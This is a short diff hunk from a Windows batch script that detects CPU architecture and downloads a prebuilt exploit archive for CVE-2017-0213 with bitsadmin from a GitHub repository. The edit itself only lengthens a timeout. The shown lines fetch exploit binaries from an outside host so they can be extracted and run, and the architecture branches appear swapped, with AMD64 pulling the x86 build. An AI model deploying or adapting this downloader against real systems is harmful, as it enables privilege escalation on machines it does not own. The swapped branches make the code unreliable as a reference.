@@ -11,7 +11,7 @@ echo [+] Detecting CPU Architecture
 if %PROCESSOR_ARCHITECTURE%==AMD64 (echo [+] Detected 64bit Architecture) else (echo [+] Detected 32bit Architecture)
 echo.
 echo Downloading %PROCESSOR_ARCHITECTURE% Exploit
-timeout 3 /nobreak
+timeout 10 /nobreak
 :: Download the correct version of exploit
 if %PROCESSOR_ARCHITECTURE%==AMD64 (bitsadmin.exe /transfer "Downloading Exploit" "https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x86.zip" "C:\Users\%username%\exploit.zip") else (bitsadmin.exe /transfer "Downloading Exploit" "https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip" "C:\Users\%username%\exploit.zip")
 :: Call the Extract
